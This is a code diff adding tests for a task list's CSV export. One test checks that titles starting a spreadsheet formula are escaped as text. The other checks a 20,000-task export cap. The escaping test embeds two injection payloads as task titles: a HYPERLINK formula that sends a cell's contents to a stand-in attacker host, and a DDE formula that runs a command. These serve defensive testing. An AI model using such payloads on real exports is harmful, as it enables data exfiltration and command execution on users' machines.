@@ -76,6 +76,29 @@ describe("the Space List tab's export", () => {
     expect(lines[1]).toMatch(/^"Task 1","Shipped","Roadmap","Ann Lee","/);
   });
 
+  it("writes a title that would start a formula as text, and keeps dates and plain titles as they are", async () => {
+    task("b-open", "TO_DO");
+    db.items[0].title = '=HYPERLINK("https://evil.test/?"&B2,"Open")';
+    task("b-open", "TO_DO");
+    db.items[1].title = "-cmd|' /C calc'!A0";
+    const { lines } = await csv();
+    expect(lines.find((l) => l.includes("HYPERLINK"))).toMatch(/^"'=HYPERLINK/);
+    expect(lines.find((l) => l.includes("cmd|"))).toMatch(/^"'-cmd/);
+    // The Updated column is an ISO date, which starts with a digit, untouched.
+    expect(lines[1]).toMatch(/,"2026-01-01T/);
+  });
+
+  it("stops at 20,000 tasks and says so in the file, and says nothing at exactly 20,000", async () => {
+    for (let i = 0; i < 20_000; i++) task("b-open", "TO_DO");
+    const exact = await csv();
+    expect(exact.lines).toHaveLength(1 + 20_000);
+    expect(exact.lines.at(-1)).not.toMatch(/Cut at/);
+    task("b-open", "TO_DO");
+    const over = await csv();
+    expect(over.lines).toHaveLength(1 + 20_000 + 1);
+    expect(over.lines.at(-1)).toMatch(/^"Cut at 20,000 tasks\./);
+  });
+
   it("refuses a Guest and an Agent", async () => {
     st.viewer = { orgRole: "GUEST", isAgent: false, actingAs: undefined };
     expect((await csv()).status).toBe(403);
